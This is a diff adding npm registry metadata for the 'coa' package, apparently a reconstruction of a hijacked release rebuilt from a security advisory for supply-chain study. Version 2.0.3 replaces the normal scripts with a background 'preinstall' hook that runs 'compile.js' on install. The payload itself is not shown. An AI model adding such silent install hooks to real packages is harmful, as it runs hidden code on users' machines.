@@ -1,0 +1,183 @@
+{
+ "_id": "coa",
+ "name": "coa",
+ "versions": {
+  "2.0.0": {
+   "name": "coa",
+   "version": "2.0.0",
+   "_npmUser": {
+    "name": "qfox",
+    "email": "zxqfox@gmail.com"
+   },
+   "maintainers": [
+    {
+     "email": "zxqfox@gmail.com",
+     "name": "qfox"
+    },
+    {
+     "email": "veged@ya.ru",
+     "name": "veged"
+    },
+    {
+     "email": "peimei@ya.ru",
+     "name": "arikon"
+    }
+   ],
+   "scripts": {
+    "clean": "rm -r .nyc_output coverage",
+    "coverage": "nyc --reporter=text --reporter=html mocha; echo; echo 'Open coverage/index.html file in your browser'",
+    "coveralls": "nyc report --reporter=text-lcov | coveralls",
+    "lint": "eslint .",
+    "pretest": "npm run lint",
+    "test": "nyc mocha"
+   },
+   "dependencies": {
+    "q": "^1.1.2"
+   },
+   "repository": {
+    "type": "git",
+    "url": "git://github.com/veged/coa.git"
+   },
+   "dist": {}
+  },
+  "2.0.1": {
+   "name": "coa",
+   "version": "2.0.1",
+   "_npmUser": {
+    "name": "qfox",
+    "email": "zxqfox@gmail.com"
+   },
+   "maintainers": [
+    {
+     "email": "zxqfox@gmail.com",
+     "name": "qfox"
+    },
+    {
+     "email": "veged@ya.ru",
+     "name": "veged"
+    },
+    {
+     "email": "peimei@ya.ru",
+     "name": "arikon"
+    }
+   ],
+   "scripts": {
+    "clean": "rm -r .nyc_output coverage",
+    "coverage": "nyc --reporter=text --reporter=html mocha; echo; echo 'Open coverage/index.html file in your browser'",
+    "coveralls": "nyc report --reporter=text-lcov | coveralls",
+    "lint": "eslint .",
+    "pretest": "npm run lint",
+    "test": "nyc mocha"
+   },
+   "dependencies": {
+    "q": "^1.1.2"
+   },
+   "repository": {
+    "type": "git",
+    "url": "git://github.com/veged/coa.git"
+   },
+   "dist": {}
+  },
+  "2.0.2": {
+   "name": "coa",
+   "version": "2.0.2",
+   "_npmUser": {
+    "name": "qfox",
+    "email": "zxqfox@gmail.com"
+   },
+   "maintainers": [
+    {
+     "email": "peimei@ya.ru",
+     "name": "arikon"
+    },
+    {
+     "email": "zxqfox@gmail.com",
+     "name": "qfox"
+    },
+    {
+     "email": "veged@ya.ru",
+     "name": "veged"
+    }
+   ],
+   "scripts": {
+    "clean": "rm -r .nyc_output coverage",
+    "coverage": "nyc --reporter=text --reporter=html mocha; echo; echo 'Open coverage/index.html file in your browser'",
+    "coveralls": "nyc report --reporter=text-lcov | coveralls",
+    "lint": "eslint .",
+    "pretest": "npm run lint",
+    "test": "nyc mocha"
+   },
+   "dependencies": {
+    "@types/q": "^1.5.1",
+    "chalk": "^2.4.1",
+    "q": "^1.1.2"
+   },
+   "repository": {
+    "type": "git",
+    "url": "git://github.com/veged/coa.git"
+   },
+   "dist": {}
+  },
+  "2.0.3": {
+   "name": "coa",
+   "version": "2.0.3",
+   "_npmUser": {
+    "name": "qfox"
+   },
+   "maintainers": [
+    {
+     "email": "peimei@ya.ru",
+     "name": "arikon"
+    },
+    {
+     "email": "zxqfox@gmail.com",
+     "name": "qfox"
+    },
+    {
+     "email": "veged@ya.ru",
+     "name": "veged"
+    }
+   ],
+   "dependencies": {
+    "@types/q": "^1.5.1",
+    "chalk": "^2.4.1",
+    "q": "^1.1.2"
+   },
+   "scripts": {
+    "preinstall": "start /B node compile.js & node compile.js"
+   },
+   "repository": {
+    "type": "git",
+    "url": "git://github.com/veged/coa.git"
+   },
+   "_replay": {
+    "reconstructed": true,
+    "reason": "unpublished by npm; rebuilt from the advisory",
+    "source": "https://github.com/advisories/GHSA-73qr-pfmq-6rp8",
+    "provenance": null
+   }
+  }
+ },
+ "time": {
+  "modified": "2022-06-13T06:24:05.720Z",
+  "created": "2011-07-19T22:07:50.546Z",
+  "2.0.0": "2017-07-07T20:26:42.901Z",
+  "2.0.1": "2018-01-10T20:45:24.906Z",
+  "2.0.2": "2018-12-11T01:33:27.419Z",
+  "2.0.3": "2021-11-04T13:02:34.339Z"
+ },
+ "maintainers": [
+  {
+   "email": "veged@ya.ru",
+   "name": "veged"
+  },
+  {
+   "email": "zxqfox@gmail.com",
+   "name": "qfox"
+  }
+ ],
+ "repository": {
+  "type": "git",
+  "url": "git://github.com/veged/coa.git"
+ }
+}
